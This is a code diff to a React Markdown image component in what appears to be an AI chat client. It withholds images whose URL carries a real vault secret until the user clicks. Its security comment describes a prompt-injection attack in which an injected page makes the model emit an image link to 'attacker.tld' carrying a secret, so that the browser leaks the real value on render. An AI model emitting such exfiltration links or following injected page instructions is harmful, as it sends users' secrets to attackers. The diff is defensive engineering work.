@@ -2,6 +2,8 @@ import { useContext, useState, type Ref } from "react";
 import { MarkdownDocContext } from "../context";
 import { useStoredImage } from "../../media/MessageImage";
 import { useInView } from "../../../hooks/useInView";
+import { hrefCarriesVaultValue } from "../logic/hrefCarriesVault";
+import { useT } from "../../../i18n";
 
 /**
  * An image inside a Markdown reply. Two sources, two components (so no hook is ever
@@ -54,9 +56,34 @@ function StoredImage({ name, alt, ids }: { name: string; alt?: string; ids: stri
   );
 }
 
+/**
+ * ⚠️ SECURITY — an image whose `src` carries a REAL vault value is NOT loaded on sight.
+ * It is the SAME hole as the link preview (`MarkdownLink`, which states it in full) and
+ * the same helper answers it: the model only ever holds fakes, so an injected page can
+ * make it emit `![](https://attacker.tld/?d=<fake>)`; the reply is un-redacted before it
+ * is parsed, so the browser would GET the REAL value from an attacker-chosen host with no
+ * user action — a fake→real oracle over the whole vault. A link at least needed a click;
+ * an `<img>` fires by itself, which is why this had to be gated too. Loading it stays
+ * available — as a CLICK, i.e. the user's own action (rule 11's outward-real).
+ */
 // eslint-disable-next-line @typescript-eslint/no-explicit-any
 function UrlImage({ src, alt, ...rest }: any) {
+  const t = useT();
+  const { vault } = useContext(MarkdownDocContext);
   const [state, setState] = useState<"loading" | "loaded" | "failed">(src ? "loading" : "failed");
+  // The user's own decision to fetch it anyway. Hooks stay unconditional (above).
+  const [asked, setAsked] = useState(false);
+  const withheld =
+    !asked && hrefCarriesVaultValue(typeof src === "string" ? src : undefined, vault);
+  if (withheld) {
+    return (
+      <span className="md-img is-withheld">
+        <button type="button" className="md-img-withheld" onClick={() => setAsked(true)}>
+          {t.conversation.bubble.imageWithheld} · <b>{t.conversation.bubble.imageWithheldLoad}</b>
+        </button>
+      </span>
+    );
+  }
   return (
     <span className={`md-img is-${state}`}>
       {state === "loading" && <span className="md-img-skeleton" aria-hidden="true" />}
